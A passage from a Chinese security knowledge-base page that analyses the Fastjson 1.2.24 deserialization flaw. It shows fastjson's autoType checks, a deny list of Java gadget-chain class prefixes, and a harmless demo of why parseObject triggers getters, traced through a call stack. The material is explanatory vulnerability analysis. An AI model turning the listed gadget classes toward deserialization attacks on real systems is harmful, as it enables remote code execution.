0; i &lt; this.acceptList.length; ++i) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        accept = this.acceptList[i];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        if (className.startsWith(accept)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            return clazz;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                if (this.autoTypeSupport || expectClass != null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                if (clazz != null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    if (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        throw new JSONException(&quot;autoType is not support. &quot; + typeName);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    if (expectClass != null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        if (expectClass.isAssignableFrom(clazz)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            return clazz;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                if (!this.autoTypeSupport) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                } else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    return clazz;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span></code></pre></div></div>
<p>这里遍历denyList数组，只要引用的库中是以我们的黑名单中的字符串开头的就直接抛出异常中断运行。</p>
<p>denyList数组，主要利用黑名单机制把常用的反序列化利用库都添加到黑名单中，主要有：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">bsh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">com.mchange</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">com.sun.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">java.lang.Thread</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">java.net.Socket</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">java.rmi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">javax.xml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.apache.bcel</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.apache.commons.beanutils</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.apache.commons.collections.Transformer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.apache.commons.collections.functors</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.apache.commons.collections4.comparators</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.apache.commons.fileupload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.apache.myfaces.context.servlet</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.apache.tomcat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.apache.wicket.util</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.codehaus.groovy.runtime</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.hibernate</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.jboss</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.mozilla.javascript</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.python.core</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.springframework</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="一些细节">一些细节<a href="#一些细节" class="hash-link" aria-label="一些细节的直接链接" title="一些细节的直接链接">​</a></h2>
<p><code>parseObject(String text)</code>在反序列化时也会调用<code>getter</code>方法，所以也是一个可利用的点，只不过比较鸡肋，符合条件的利用链很少</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="举例演示">举例演示<a href="#举例演示" class="hash-link" aria-label="举例演示的直接链接" title="举例演示的直接链接">​</a></h3>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.alibaba.fastjson.JSON;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class App {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String json = &quot;{\&quot;@type\&quot;:\&quot;org.example.User\&quot;,\&quot;age\&quot;:66,\&quot;username\&quot;:\&quot;test\&quot;}&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;parseObject(String)&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        JSON.parseObject(json);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;parse(String)&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        JSON.parse(json);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">class User {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private String username;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private int age;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void setUsername(String username) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        this.username = username;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;call setUsername&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public String getUsername() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;call getUsername&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return username;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public void setAge(int age) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        this.age = age;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;call setAge&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public int getAge() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(&quot;call getAge&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return age;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>![image-20210927110649337](9.Fastjson 1.2.24反序列化漏洞分析.assets/image-20210927110649337.png)</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="分析-1">分析<a href="#分析-1" class="hash-link" aria-label="分析的直接链接" title="分析的直接链接">​</a></h3>
<p>为什么会调用<code>getter()</code>方法呢？在<code>getter()</code>方法的地方下断点，查看调用栈</p>
<p>![image-20210927111313273](9.Fastjson 1.2.24反序列化漏洞分析.assets/image-20210927111313273.png)</p>
<div class="language-stack codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-stack codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">getAge:37, User (org.example)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">invoke:498, Method (java.lang.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">get:451, FieldInfo (com.alibaba.fastjson.util)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">getPropertyValue:114, FieldSerializer (com.alibaba.fastjson.serializer)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">getFieldValuesMap:439, JavaBeanSerializer (com.alibaba.fastjson.serializer)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">toJSON:902, JSON (com.alibaba.fastjson)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">toJSON:824, JSON (com.alibaba.fastjson)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">parseObject:206, JSON (com.alibaba.fastjson)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">main:10, App (org.example)</span><br></span></code></pre></div></div>
<p>分析调用栈，首先进入<code>parseObject</code>方法，然后正常调用<code>parse</code>方法（PS：此时<code>setter</code>方法已经被调用了，可以查看<code>Console</code>栏当前输出的情况）</p>
<p>![image-20210927111400714](9.Fastjson 1.2.24反序列化漏洞分析.assets/image-20210927111400714.png)</p>
<p>所以调用<code>getter</code>方法的原因，不是出在<code>parse</code>函数里面，而是调用了<code>(JSONObject)toJSON(obj)</code>方法</p>
<p>继续跟<code>toJSON</code>方法，发现会到<code>javaBeanSerializer.getFieldValuesMap(javaObject)</code></p>
<p>![image-20210927112551712](9.Fastjson 1.2.24反序列化漏洞分析.assets/image-20210927112551712.png)</p>
<p>查看当前的变量，<code>javaBeanSerializer</code>中的<code>getters</code>存放了相关的<code>getter</code>方法后缀，<code>javaObject</code>中存放了相关变量的值</p>
<p>跟进<code>getFieldValuesMap</code>，发现通过<code>Map.put</code>存入数据，值通过<code>getter.getPropertyValue(object)</code>进行获取，<code>object</code>存放的是<code>setter</code>设置的变量名和值</p>
<p>![image-20210927114607224](9.Fastjson 1.2.24反序列化漏洞分析.assets/image-20210927114607224.png)</p>
<p>跟进<code>getPropertyValue</code>，会调用<code>this.fieldInfo.get</code>方法</p>
<p>![image-20210927115127938](9.Fastjson 1.2.24反序列化漏洞分析.assets/image-20210927115127938.png)</p>
<p>跟进<code>get</code>，发现反射调用<code>User</code>类的<code>getAge()</code>方法</p>
<p>![image-20210927115417279](9.Fastjson 1.2.24反序列化漏洞分析.assets/image-20210927115417279.png)</p>
<p>所以<code>getter</code>方法被执行了</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="templatesimpl攻击调用链路">TemplatesImpl攻击调用链路<a href="#templatesimpl攻击调用链路" class="hash-link" aria-label="TemplatesImpl攻击调用链路的直接链接" title="TemplatesImpl攻击调用链路的直接链接">​</a></h3>
<blockquote>
<p><a href="https://paper.seebug.org/1274/#templatesimpl" target="_blank" rel="noopener noreferrer">https://paper.seebug.org/1274/#templatesimpl</a></p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="参考链接">参考链接<a href="#参考链接" class="hash-link" aria-label="参考链接的直接链接" title="参考链接的直接链接">​</a></h2>
<ul>
<li><a href="https://paper.seebug.org/1274/" target="_blank" rel="noopener noreferrer">Fastjson 1.2.24 反序列化漏洞深度分析</a></li>
</ul></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">最后<!-- -->由 <b>d4m1ts</b> <!-- -->于 <b><time datetime="2025-06-01T04:26:30.000Z" itemprop="dateModified">2025年6月1日</time></b> <!-- -->更新</span></div></div></footer></article><nav class="pagination-nav" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/代码审计/Java安全/应用漏洞分析/log4j反序列化漏洞分析"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">log4j反序列化漏洞分析</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/代码审计/Java安全/应用漏洞分析/Fastjson的dnslog探测方式分析"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Fastjson的dnslog探测方式分析</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#前言" class="table-of-contents__link toc-highlight">前言</a></li><li><a href="#demo" class="table-of-contents__link toc-highlight">DEMO</a><ul><li><a href="#环境搭建" class="table-of-contents__link toc-highlight">环境搭建</a></li><li><a href="#序列化" class="table-of-contents__link toc-highlight">序列化</a></li><li><a href="#反序列化️" class="table-of-contents__link toc-highlight">反序列化‼️</a></li></ul></li><li><a href="#利用链" class="table-of-contents__link toc-highlight">利用链</a><ul><li><a href="#分析" class="table-of-contents__link toc-highlight">分析</a></li><li><a href="#利用" class="table-of-contents__link toc-highlight">利用</a></li><li><a href="#复现" class="table-of-contents__link toc-highlight">复现</a></li></ul></li><li><a href="#总结" class="table-of-contents__link toc-highlight">总结</a></li><li><a href="#debug分析" class="table-of-contents__link toc-highlight">DEBUG分析</a></li><li><a href="#修复方案" class="table-of-contents__link toc-highlight">修复方案</a></li><li><a href="#一些细节" class="table-of-contents__link toc-highlight">一些细节</a><ul><li><a href="#举例演示" class="table-of-contents__link toc-highlight">举例演示</a></li><li><a href="#分析-1" class="table-of-contents__link toc-highlight">分析</a></li><li><a href="#templatesimpl攻击调用链路" class="table-of-contents__link toc-highlight">TemplatesImpl攻击调用链路</a></li></ul></li><li><a href="#参考链接" class="table-of-contents__link toc-highlight">参考链接</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">内容导航</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/friends">友情链接</a></li><li class="footer__item"><a class="footer__link-item" href="/promotions">我的推广</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">实用工具</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://markdown.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">在线Markdown<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://rshell.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Reverse Shell Generator<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://gtfobins.gm7.org/" target="_blank" rel="noopener noreferrer" class="footer__link-item">GTFOBins<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">关注我</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="mailto:admin@gm7.org" target="_blank" rel="noopener noreferrer" class="footer__link-item">联系我<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 d4m1ts 知识库</div></div></div></footer></div>
</body>
</html>